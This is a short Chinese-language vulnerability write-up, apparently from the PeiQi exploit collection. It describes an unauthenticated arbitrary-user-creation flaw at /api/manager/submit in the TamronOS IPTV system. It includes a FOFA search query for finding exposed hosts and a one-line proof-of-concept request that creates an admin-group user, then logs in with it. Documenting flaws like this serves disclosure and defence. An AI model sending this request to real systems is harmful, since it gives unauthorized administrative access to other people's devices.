---
title: TamronOS IPTV系统 submit 任意用户创建漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - TamronOS
---

# TamronOS IPTV系统 submit 任意用户创建漏洞

## 漏洞描述

TamronOS IPTV系统 /api/manager/submit 存在任意用户创建漏洞，攻击者通过漏洞可以任意用户创建进入后台

## 漏洞影响

> [!NOTE]
>
> TamronOS IPTV系统

## FOFA

> [!NOTE]
>
> app="TamronOS-IPTV系统"

## 漏洞复现

登录页面如下

![image-20210615145308242](/img/20210924020242202847.png)

漏洞POC为

```
/api/manager/submit?group=1&username=test&password=123456
```

![image-20210615145547635](/img/20210924020242753360.png)

```
user: test
pass: 123456
```

![image-20210615145605871](/img/20210924020243033289.png)